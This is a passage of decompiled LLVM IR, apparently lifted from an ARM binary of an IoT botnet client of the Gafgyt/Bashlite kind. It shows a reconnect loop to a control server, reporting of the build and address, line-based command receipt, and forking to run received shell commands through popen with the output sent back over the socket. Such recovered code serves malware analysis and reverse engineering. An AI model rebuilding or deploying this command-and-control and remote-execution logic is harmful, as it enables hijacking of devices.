  %v2_120c026 = icmp eq i32 %v0_120b824, 0
  br i1 %v2_120c026, label %dec_label_pc_120d4, label %dec_label_pc_120c8

dec_label_pc_120c8:                               ; preds = %dec_label_pc_120b8.outer, %dec_label_pc_120c8
  %v1_120cc = call i32 @sleep(i32 30)
  %v0_120b8 = call i32 @initConnection()
  %v2_120c0 = icmp eq i32 %v0_120b8, 0
  br i1 %v2_120c0, label %dec_label_pc_120d4, label %dec_label_pc_120c8

dec_label_pc_120d4:                               ; preds = %dec_label_pc_120c8, %dec_label_pc_120b8.outer
  %v2_120d8 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_120d8, i32* @r4, align 4
  %v0_120dc = call i32 @getBuild()
  store i32 %v0_120dc, i32* @r5, align 4
  %v2_120e8 = load i32, i32* @global_var_2cae0.485, align 4
  store i32 %v2_120e8, i32* @r0, align 4
  %v1_120ec = call i32 @__GI_inet_ntoa(i32 %v2_120e8)
  %v0_120f4 = load i32, i32* @r4, align 4
  %v0_120fc = load i32, i32* @r5, align 4
  store i32 %v0_120fc, i32* @r2, align 4
  %v3_12100 = call i32 @sockprintf(i32 %v0_120f4, i32 ptrtoint ([12 x i8]* @global_var_1cbf4.816 to i32))
  br label %dec_label_pc_12944.outer

dec_label_pc_12124:                               ; preds = %dec_label_pc_123d4, %dec_label_pc_12380
  %v3_12128 = mul i32 %v3_123c8, 4
  %v2_12134 = load i32, i32* @global_var_2caec.75, align 4
  %v2_12138 = add i32 %v2_12134, %v3_12128
  %v1_1213c = inttoptr i32 %v2_12138 to i32*
  %v2_1213c = load i32, i32* %v1_1213c, align 4
  %v3_1214c = call i32 @__libc_waitpid(i32 %v2_1213c, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_1214c, 1
  br i1 %tmp111, label %dec_label_pc_12374, label %dec_label_pc_121b4

dec_label_pc_1216c:                               ; preds = %dec_label_pc_12210, %dec_label_pc_121b4
  %v3_12170 = mul i32 %v1_12160, 4
  %v2_1217c = load i32, i32* @global_var_2caec.75, align 4
  %v2_12180 = add i32 %v2_1217c, %v3_12170
  %v1_12184 = add i32 %v2_12180, -4
  %v1_121a0 = inttoptr i32 %v2_12180 to i32*
  %v2_121a0 = load i32, i32* %v1_121a0, align 4
  %v2_121a4 = inttoptr i32 %v1_12184 to i32*
  store i32 %v2_121a0, i32* %v2_121a4, align 4
  br label %dec_label_pc_121b4

dec_label_pc_121b4:                               ; preds = %dec_label_pc_12124, %dec_label_pc_1216c
  %v3_1215c.sink = phi i32 [ %v1_12160, %dec_label_pc_1216c ], [ %v3_123c8, %dec_label_pc_12124 ]
  %v1_12160 = add i32 %v3_1215c.sink, 1
  %v2_121d0 = load i32, i32* @global_var_2686c.72, align 4
  %v5_121d0 = load i32, i32* @global_var_26870.73, align 4
  %tmp112 = icmp ugt i32 %v5_121d0, %v1_12160
  br i1 %tmp112, label %dec_label_pc_1216c, label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %dec_label_pc_121b4
  %v9_12208 = icmp eq i32 %v5_121d0, %v1_12160
  br i1 %v9_12208, label %dec_label_pc_12210, label %dec_label_pc_12228

dec_label_pc_12210:                               ; preds = %dec_label_pc_121f8
  %v9_12220 = icmp eq i32 %v2_121d0, 0
  br i1 %v9_12220, label %dec_label_pc_12228, label %dec_label_pc_1216c

dec_label_pc_12228:                               ; preds = %dec_label_pc_12210, %dec_label_pc_121f8
  %v3_1222c = mul i32 %v1_12160, 4
  %v2_12238 = load i32, i32* @global_var_2caec.75, align 4
  %v2_1223c = add i32 %v3_1222c, -4
  %v1_12240 = add i32 %v2_1223c, %v2_12238
  %v2_12248 = inttoptr i32 %v1_12240 to i32*
  store i32 0, i32* %v2_12248, align 4
  %v2_12250 = load i32, i32* @global_var_2686c.72, align 4
  %v5_12250 = load i32, i32* @global_var_26870.73, align 4
  %v2_1225c = add i32 %v2_12250, -1
  %v3_1225c = icmp ne i32 %v2_12250, 0
  %v3_12260 = add i32 %v5_12250, -1
  %v4_12260 = zext i1 %v3_1225c to i32
  %v5_12260 = add i32 %v3_12260, %v4_12260
  store i32 %v2_1225c, i32* @global_var_2686c.72, align 4
  store i32 %v5_12260, i32* @global_var_26870.73, align 4
  %v3_12274 = udiv i32 %v2_1225c, 1073741824
  %v3_12278 = mul i32 %v5_12260, 4
  %v2_1227c = or i32 %v3_12278, %v3_12274
  store i32 %v2_1227c, i32* @r4, align 4
  %v3_12280 = mul i32 %v2_1225c, 4
  %v1_12284 = add i32 %v3_12280, 4
  %v1_1228c = call i32 @malloc(i32 %v1_12284)
  br label %dec_label_pc_122e4

dec_label_pc_122a4:                               ; preds = %dec_label_pc_12340, %dec_label_pc_122e4
  %v3_122a8 = mul i32 %v3_12334, 4
  %v2_122b4 = add i32 %v3_122a8, %v1_1228c
  %v2_122c8 = load i32, i32* @global_var_2caec.75, align 4
  %v2_122cc = add i32 %v2_122c8, %v3_122a8
  %v1_122d0 = inttoptr i32 %v2_122cc to i32*
  %v2_122d0 = load i32, i32* %v1_122d0, align 4
  %v2_122d4 = inttoptr i32 %v2_122b4 to i32*
  store i32 %v2_122d0, i32* %v2_122d4, align 4
  %v1_122dc = add i32 %v3_12334, 1
  br label %dec_label_pc_122e4

dec_label_pc_122e4:                               ; preds = %dec_label_pc_12228, %dec_label_pc_122a4
  %v3_12334 = phi i32 [ 0, %dec_label_pc_12228 ], [ %v1_122dc, %dec_label_pc_122a4 ]
  %v2_12300 = load i32, i32* @global_var_2686c.72, align 4
  %v5_12300 = load i32, i32* @global_var_26870.73, align 4
  %tmp113 = icmp ugt i32 %v5_12300, %v3_12334
  br i1 %tmp113, label %dec_label_pc_122a4, label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %dec_label_pc_122e4
  %v9_12338 = icmp eq i32 %v5_12300, %v3_12334
  br i1 %v9_12338, label %dec_label_pc_12340, label %dec_label_pc_12358

dec_label_pc_12340:                               ; preds = %dec_label_pc_12328
  %v9_12350 = icmp eq i32 %v2_12300, 0
  br i1 %v9_12350, label %dec_label_pc_12358, label %dec_label_pc_122a4

dec_label_pc_12358:                               ; preds = %dec_label_pc_12340, %dec_label_pc_12328
  %v2_1235c = load i32, i32* @global_var_2caec.75, align 4
  store i32 %v2_1235c, i32* @r0, align 4
  %v0_12364 = call i32 @free()
  store i32 %v1_1228c, i32* @global_var_2caec.75, align 4
  br label %dec_label_pc_12374

dec_label_pc_12374:                               ; preds = %dec_label_pc_12124, %dec_label_pc_12358
  %v1_12378 = add i32 %v3_123c8, 1
  br label %dec_label_pc_12380

dec_label_pc_12380:                               ; preds = %dec_label_pc_12944, %dec_label_pc_12374
  %v3_123c8 = phi i32 [ %v1_12378, %dec_label_pc_12374 ], [ 0, %dec_label_pc_12944 ]
  %v3_12388 = ashr i32 %v3_123c8, 31
  %v2_12398 = load i32, i32* @global_var_2686c.72, align 4
  %v5_12398 = load i32, i32* @global_var_26870.73, align 4
  %v3_123b4 = icmp uge i32 %v5_12398, %v3_123c8
  %v9_123b4 = icmp eq i32 %v5_12398, %v3_123c8
  %v2_123b8 = xor i1 %v9_123b4, true
  %v3_123b8 = and i1 %v3_123b4, %v2_123b8
  br i1 %v3_123b8, label %dec_label_pc_12124, label %dec_label_pc_123bc

dec_label_pc_123bc:                               ; preds = %dec_label_pc_12380
  br i1 %v9_123b4, label %dec_label_pc_123d4, label %dec_label_pc_123ec

dec_label_pc_123d4:                               ; preds = %dec_label_pc_123bc
  %tmp = icmp ugt i32 %v2_12398, %v3_12388
  br i1 %tmp, label %dec_label_pc_12124, label %dec_label_pc_123ec

dec_label_pc_123ec:                               ; preds = %dec_label_pc_123bc, %dec_label_pc_123d4
  %v2_12400 = add i32 %v2_123fc, %v5_12964
  %v3_12408 = inttoptr i32 %v2_12400 to i8*
  store i8 0, i8* %v3_12408, align 1
  %v2_1241c = call i32 @trim(i8* %v4_12964)
  %v4_12434 = call i32 @strstr(i32 %v2_12954, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b718.56, i32 0, i32 0))
  store i32 %v4_12434, i32* @r2, align 4
  %v9_12448 = icmp eq i32 %v4_12434, %v2_12954
  br i1 %v9_12448, label %dec_label_pc_12450, label %dec_label_pc_12468

dec_label_pc_12450:                               ; preds = %dec_label_pc_123ec
  %v2_12454 = load i32, i32* @global_var_26864.54, align 4
  %v3_12460 = call i32 @sockprintf(i32 %v2_12454, i32 ptrtoint ([5 x i8]* @global_var_1cc00.821 to i32))
  br label %dec_label_pc_12944

dec_label_pc_12468:                               ; preds = %dec_label_pc_123ec
  %v6_1247c = call i32 @strstr(i32 %v2_12954, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cc08.823, i32 0, i32 0))
  %v9_12490 = icmp eq i32 %v6_1247c, %v2_12954
  br i1 %v9_12490, label %dec_label_pc_12498, label %dec_label_pc_124c4

dec_label_pc_12498:                               ; preds = %dec_label_pc_12468
  %v1_1249c = add i32 %stack_var_-96.2.ph, 1
  %v2_124ac = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1cc0c.825 to i32))
  %v7_124b8 = icmp slt i32 %v1_1249c, 21
  br i1 %v7_124b8, label %dec_label_pc_120b8.outer, label %dec_label_pc_124bc

dec_label_pc_124bc:                               ; preds = %dec_label_pc_12498
  %v1_124c0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_124c4

dec_label_pc_124c4:                               ; preds = %dec_label_pc_12468, %dec_label_pc_124bc
  %stack_var_-96.1 = phi i32 [ %v1_1249c, %dec_label_pc_124bc ], [ %stack_var_-96.2.ph, %dec_label_pc_12468 ]
  %v2_124d8 = load i8, i8* %v4_12964, align 4
  %v7_124dc = icmp eq i8 %v2_124d8, 33
  br i1 %v7_124dc, label %dec_label_pc_12500, label %dec_label_pc_12944.outer

dec_label_pc_12500:                               ; preds = %dec_label_pc_124c4, %dec_label_pc_12510
  %v3_124e4.sink = phi i8* [ %storemerge8, %dec_label_pc_12510 ], [ %v4_12964, %dec_label_pc_124c4 ]
  %v4_124e4 = ptrtoint i8* %v3_124e4.sink to i32
  %v1_124e8 = add i32 %v4_124e4, 1
  %storemerge8 = inttoptr i32 %v1_124e8 to i8*
  %v2_12504 = load i8, i8* %storemerge8, align 1
  %v7_12508 = icmp eq i8 %v2_12504, 32
  br i1 %v7_12508, label %dec_label_pc_12520, label %dec_label_pc_12510

dec_label_pc_12510:                               ; preds = %dec_label_pc_12500
  %v2_12514 = load i8, i8* %storemerge8, align 1
  %v2_12518 = icmp eq i8 %v2_12514, 0
  br i1 %v2_12518, label %dec_label_pc_12520, label %dec_label_pc_12500

dec_label_pc_12520:                               ; preds = %dec_label_pc_12510, %dec_label_pc_12500
  %v2_12524 = load i8, i8* %storemerge8, align 1
  %v2_12528 = icmp eq i8 %v2_12524, 0
  br i1 %v2_12528, label %dec_label_pc_12944.outer, label %dec_label_pc_12530

dec_label_pc_12530:                               ; preds = %dec_label_pc_12520
  store i8 0, i8* %storemerge8, align 1
  %v3_12550 = call i32 @strlen(i8* %v5_12544)
  %v1_12564 = add i32 %v3_12550, %v2_12560
  %v5_12568 = inttoptr i32 %v1_12564 to i8*
  %v2_125b0 = add i32 %v1_12564, -1
  br label %dec_label_pc_12598

dec_label_pc_12570:                               ; preds = %dec_label_pc_125c4, %dec_label_pc_12598
  %v3_12578 = call i32 @strlen(i8* %v5_12568)
  %v1_1258c = add i32 %v2_125b0, %v3_12578
  %v3_12594 = inttoptr i32 %v1_1258c to i8*
  store i8 0, i8* %v3_12594, align 1
  br label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %dec_label_pc_12530, %dec_label_pc_12570
  %v3_125a0 = call i32 @strlen(i8* %v5_12568)
  %v1_125b4 = add i32 %v3_125a0, %v2_125b0
  %v1_125b8 = inttoptr i32 %v1_125b4 to i8*
  %v2_125b8 = load i8, i8* %v1_125b8, align 1
  %v7_125bc = icmp eq i8 %v2_125b8, 10
  br i1 %v7_125bc, label %dec_label_pc_12570, label %dec_label_pc_125c4

dec_label_pc_125c4:                               ; preds = %dec_label_pc_12598
  %v3_125cc = call i32 @strlen(i8* %v5_12568)
  %v1_125e0 = add i32 %v3_125cc, %v2_125b0
  %v1_125e4 = inttoptr i32 %v1_125e0 to i8*
  %v2_125e4 = load i8, i8* %v1_125e4, align 1
  %v7_125e8 = icmp eq i8 %v2_125e4, 13
  br i1 %v7_125e8, label %dec_label_pc_12570, label %dec_label_pc_125f0

dec_label_pc_125f0:                               ; preds = %dec_label_pc_125c4
  %v2_1260c28 = load i8, i8* %v5_12568, align 1
  %v7_1261032 = icmp eq i8 %v2_1260c28, 32
  br i1 %v7_1261032, label %dec_label_pc_12628, label %dec_label_pc_12618

dec_label_pc_125fc:                               ; preds = %dec_label_pc_12618
  %v1_12600 = add i32 %v4_1260834, 1
  %v5_12604 = inttoptr i32 %v1_12600 to i8*
  %v2_1260c = load i8, i8* %v5_12604, align 1
  %v7_12610 = icmp eq i8 %v2_1260c, 32
  br i1 %v7_12610, label %dec_label_pc_12628, label %dec_label_pc_12618

dec_label_pc_12618:                               ; preds = %dec_label_pc_125f0, %dec_label_pc_125fc
  %v4_1260834 = phi i32 [ %v1_12600, %dec_label_pc_125fc ], [ %v1_12564, %dec_label_pc_125f0 ]
  %stack_var_-64.033 = phi i8* [ %v5_12604, %dec_label_pc_125fc ], [ %v5_12568, %dec_label_pc_125f0 ]
  %v2_1261c = load i8, i8* %stack_var_-64.033, align 1
  %v2_12620 = icmp eq i8 %v2_1261c, 0
  br i1 %v2_12620, label %dec_label_pc_12628, label %dec_label_pc_125fc

dec_label_pc_12628:                               ; preds = %dec_label_pc_125fc, %dec_label_pc_12618, %dec_label_pc_125f0
  %stack_var_-64.0.lcssa = phi i8* [ %v5_12568, %dec_label_pc_125f0 ], [ %v5_12604, %dec_label_pc_125fc ], [ %stack_var_-64.033, %dec_label_pc_12618 ]
  %v4_12608.lcssa = phi i32 [ %v1_12564, %dec_label_pc_125f0 ], [ %v1_12600, %dec_label_pc_125fc ], [ %v4_1260834, %dec_label_pc_12618 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_12638 = add i32 %v4_12608.lcssa, 1
  %v2_1267c39 = load i8, i8* %v5_12568, align 1
  %v2_1268041 = icmp eq i8 %v2_1267c39, 0
  br i1 %v2_1268041, label %dec_label_pc_12688, label %dec_label_pc_1264c

dec_label_pc_1264c:                               ; preds = %dec_label_pc_12628, %dec_label_pc_1264c
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_1264c ], [ %v5_12568, %dec_label_pc_12628 ]
  %storemerge1442 = phi i32 [ %v1_12670, %dec_label_pc_1264c ], [ %v1_12564, %dec_label_pc_12628 ]
  %v2_12650 = load i8, i8* %storemerge743, align 1
  %v3_12650 = zext i8 %v2_12650 to i32
  %v1_12658 = call i32 @__GI_toupper(i32 %v3_12650)
  %v1_12668 = trunc i32 %v1_12658 to i8
  store i8 %v1_12668, i8* %storemerge743, align 1
  %v1_12670 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_12670 to i8*
  %v2_1267c = load i8, i8* %storemerge7, align 1
  %v2_12680 = icmp eq i8 %v2_1267c, 0
  br i1 %v2_12680, label %dec_label_pc_12688, label %dec_label_pc_1264c

dec_label_pc_12688:                               ; preds = %dec_label_pc_1264c, %dec_label_pc_12628
  store i32 ptrtoint ([3 x i8]* @global_var_1cc20.827 to i32), i32* @r1, align 4
  %v4_12694 = call i32 @__GI_strcoll(i8* %v5_12568, i32 ptrtoint ([3 x i8]* @global_var_1cc20.827 to i32))
  %v2_1269c = icmp eq i32 %v4_12694, 0
  br i1 %v2_1269c, label %dec_label_pc_126a4, label %dec_label_pc_127ac

dec_label_pc_126a4:                               ; preds = %dec_label_pc_12688
  %v0_126a4 = call i32 @listFork()
  %v2_126ac = icmp eq i32 %v0_126a4, 0
  br i1 %v2_126ac, label %dec_label_pc_126b4, label %dec_label_pc_12944.outer

dec_label_pc_126b4:                               ; preds = %dec_label_pc_126a4
  store i32 1024, i32* @r2, align 4
  %v3_126cc = call i32 @__GI_memset(i8* %v2_126cc, i32 0)
  %v6_126ec = call i32 @szprintf(i32 %v2_126bc, i32 ptrtoint ([8 x i8]* @global_var_1cc24.829 to i32), i32 %v1_12638, i32 %v2_126bc, i32 ptrtoint (i32* @0 to i32))
  %v3_12708 = call i32 @fdpopen(i32 %v2_126bc, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1cbc0.802, i32 0, i32 0))
  br label %dec_label_pc_12774

dec_label_pc_12718:                               ; preds = %dec_label_pc_12774
  %v2_12728 = call i32 @trim(i8* %v2_126cc)
  %v2_12730 = load i32, i32* @global_var_26864.54, align 4
  store i32 %v2_126bc, i32* @r2, align 4
  %v3_1274c = call i32 @sockprintf(i32 %v2_12730, i32 ptrtoint ([3 x i8]* @global_var_1cc2c.831 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_12768 = call i32 @__GI_memset(i8* %v2_126cc, i32 0)
  %v1_12770 = call i32 @sleep(i32 1)
  br label %dec_label_pc_12774

dec_label_pc_12774:                               ; preds = %dec_label_pc_126b4, %dec_label_pc_12718
  %v4_1278c = call i32 @fdgets(i32 %v2_126bc, i32 1024, i32 %v3_12708, i32 %v2_126bc)
  %v2_12794 = icmp eq i32 %v4_1278c, 0
  br i1 %v2_12794, label %dec_label_pc_1279c, label %dec_label_pc_12718

dec_label_pc_1279c:                               ; preds = %dec_label_pc_12774
  %v1_127a0 = call i32 @fdpclose(i32 %v3_12708)
  %v1_127a8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_127ac

dec_label_pc_127ac:                               ; preds = %dec_label_pc_12688, %dec_label_pc_1279c
  store i32 %v1_12638, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1cc30.833 to i32), i32* @r1, align 4
  %v2_127c0 = call i32 @__GI_strtok(i32 %v1_12638, i32 ptrtoint (i32* @global_var_1cc30.833 to i32))
  store i32 %v1_12564, i32* %stack_var_-624, align 4
  %v2_128c846 = icmp eq i32 %v2_127c0, 0
  br i1 %v2_128c846, label %dec_label_pc_128d0, label %dec_label_pc_127d8

dec_label_pc_127d8:                               ; preds = %dec_label_pc_127ac, %dec_label_pc_128b0
  %stack_var_-36.049.in = phi i32 [ %v2_128b8, %dec_label_pc_128b0 ], [ %v2_127c0, %dec_label_pc_127ac ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_128b0 ], [ 1, %dec_label_pc_127ac ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_127dc = load i8, i8* %stack_var_-36.049, align 1
  %v7_127e0 = icmp eq i8 %v2_127dc, 10
  br i1 %v7_127e0, label %dec_label_pc_128b0, label %dec_label_pc_127e8

dec_label_pc_127e8:                               ; preds = %dec_label_pc_127d8
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_127f4 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_127fc = add i32 %v3_127f4, 1
  %v1_12804 = call i32 @malloc(i32 %v1_127fc)
  %v0_12818 = load i32, i32* @r4, align 4
  %v3_12818 = mul i32 %v0_12818, 4
  %v2_12824 = add i32 %v2_12820, %v3_12818
  %v2_12828 = inttoptr i32 %v2_12824 to i32*
  store i32 %v1_12804, i32* %v2_12828, align 4
  %v3_12838 = mul i32 %stack_var_-40.147, 4
  %v2_12840 = add i32 %v3_12838, %v19_11d2c
  %v2_12844 = add i32 %v2_12840, -600
  %v1_12848 = inttoptr i32 %v2_12844 to i32*
  %v2_12848 = load i32, i32* %v1_12848, align 4
  store i32 %v2_12848, i32* @r4, align 4
  %v3_12854 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_1285c = add i32 %v3_12854, 1
  %v0_12860 = load i32, i32* @r4, align 4
  store i32 %v1_1285c, i32* @r2, align 4
  %v2_12870 = inttoptr i32 %v0_12860 to i8*
  %v3_12870 = call i32 @__GI_memset(i8* %v2_12870, i32 0)
  %v2_12890 = load i32, i32* %v1_12848, align 4
  %v4_128a0 = call i32 @strcpy(i32 %v2_12890, i8* nonnull %stack_var_-36.049)
  %v1_128a8 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_127d8, %dec_label_pc_127e8
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_127d8 ], [ %v1_128a8, %dec_label_pc_127e8 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1cc30.833 to i32), i32* @r1, align 4
  %v2_128b8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cc30.833 to i32))
  %v2_128c8 = icmp eq i32 %v2_128b8, 0
  br i1 %v2_128c8, label %dec_label_pc_128d0, label %dec_label_pc_127d8

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128b0, %dec_label_pc_127ac
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_127ac ], [ %stack_var_-40.0, %dec_label_pc_128b0 ]
  %v3_128dc = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_128e8 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_128e8, label %dec_label_pc_12944.outer, label %dec_label_pc_12900.lr.ph

dec_label_pc_12900.lr.ph:                         ; preds = %dec_label_pc_128d0
  br label %dec_label_pc_12900

dec_label_pc_12900:                               ; preds = %dec_label_pc_12900.lr.ph, %dec_label_pc_12900
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_12900.lr.ph ], [ %v1_1292c, %dec_label_pc_12900 ]
  %v3_1290c = mul i32 %storemerge15127, 4
  %v2_12914 = add i32 %v3_1290c, %v19_11d2c
  %v2_12918 = add i32 %v2_12914, -600
  %v1_1291c = inttoptr i32 %v2_12918 to i32*
  %v2_1291c = load i32, i32* %v1_1291c, align 4
  store i32 %v2_1291c, i32* @r0, align 4
  %v0_12924 = call i32 @free()
  %v1_1292c = add nuw nsw i32 %storemerge15127, 1
  %v5_12940 = icmp slt i32 %v1_1292c, %stack_var_-40.1.lcssa
  br i1 %v5_12940, label %dec_label_pc_12900, label %dec_label_pc_12944.outer

dec_label_pc_12944.outer:                         ; preds = %dec_label_pc_12900, %dec_label_pc_124c4, %dec_label_pc_126a4, %dec_label_pc_128d0, %dec_label_pc_12520, %dec_label_pc_120d4
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_120d4 ], [ %stack_var_-96.1, %dec_label_pc_12520 ], [ %stack_var_-96.1, %dec_label_pc_128d0 ], [ %stack_var_-96.1, %dec_label_pc_126a4 ], [ %stack_var_-96.1, %dec_label_pc_124c4 ], [ %stack_var_-96.1, %dec_label_pc_12900 ]
  br label %dec_label_pc_12944

dec_label_pc_12944:                               ; preds = %dec_label_pc_12944.outer, %dec_label_pc_12450
  %v2_12948 = load i32, i32* @global_var_26864.54, align 4
  %v5_12964 = call i32 @recvLine(i32 %v2_12948, i8* %v4_12964, i32 4096, i32 %v2_12954)
  %v3_12974 = icmp eq i32 %v5_12964, -1
  br i1 %v3_12974, label %dec_label_pc_120b8.outer, label %dec_label_pc_12380

; uselistorder directives
  uselistorder i32 %v5_12964, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_128b8, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_12670, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_12638, { 1, 2, 0 }
  uselistorder i32 %v2_125b0, { 1, 2, 0 }
  uselistorder i8* %v5_12568, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_12564, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_1249c, { 1, 2, 0 }
  uselistorder i1 %v9_123b4, { 1, 0 }
  uselistorder i32 %v3_123c8, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_12300, { 1, 0 }
  uselistorder i32 %v3_12334, { 1, 2, 0, 3 }
  uselistorder i32 %v3_122a8, { 1, 0 }
  uselistorder i32 %v1_1228c, { 1, 0 }
  uselistorder i32 %v5_121d0, { 1, 0 }
  uselistorder i32 %v1_12160, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_126bc, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_12964, { 3, 0, 1, 2 }
  uselistorder i32 %v2_12954, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v3_11fc8, { 1, 0, 2 }
  uselistorder i32 %v2_11f2c, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1cc30.833 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37 }
  uselistorder i32 ()* @listFork, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2686c.72, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2caec.75, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @sockprintf, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 22, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_2cae0.485, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32* @global_var_26864.54, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 30, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 5, 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_1cbc0.802, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1cbc0.802 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 25, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 5, 6, 23, 24 }
  uselistorder label %dec_label_pc_12944.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_12900, { 1, 0 }
  uselistorder label %dec_label_pc_128b0, { 1, 0 }
  uselistorder label %dec_label_pc_127d8, { 1, 0 }
  uselistorder label %dec_label_pc_127ac, { 1, 0 }
  uselistorder label %dec_label_pc_12774, { 1, 0 }
  uselistorder label %dec_label_pc_1264c, { 1, 0 }
  uselistorder label %dec_label_pc_12628, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12618, { 1, 0 }
  uselistorder label %dec_label_pc_12598, { 1, 0 }
  uselistorder label %dec_label_pc_12500, { 1, 0 }
  uselistorder label %dec_label_pc_124c4, { 1, 0 }
  uselistorder label %dec_label_pc_123ec, { 1, 0 }
  uselistorder label %dec_label_pc_12374, { 1, 0 }
  uselistorder label %dec_label_pc_122e4, { 1, 0 }
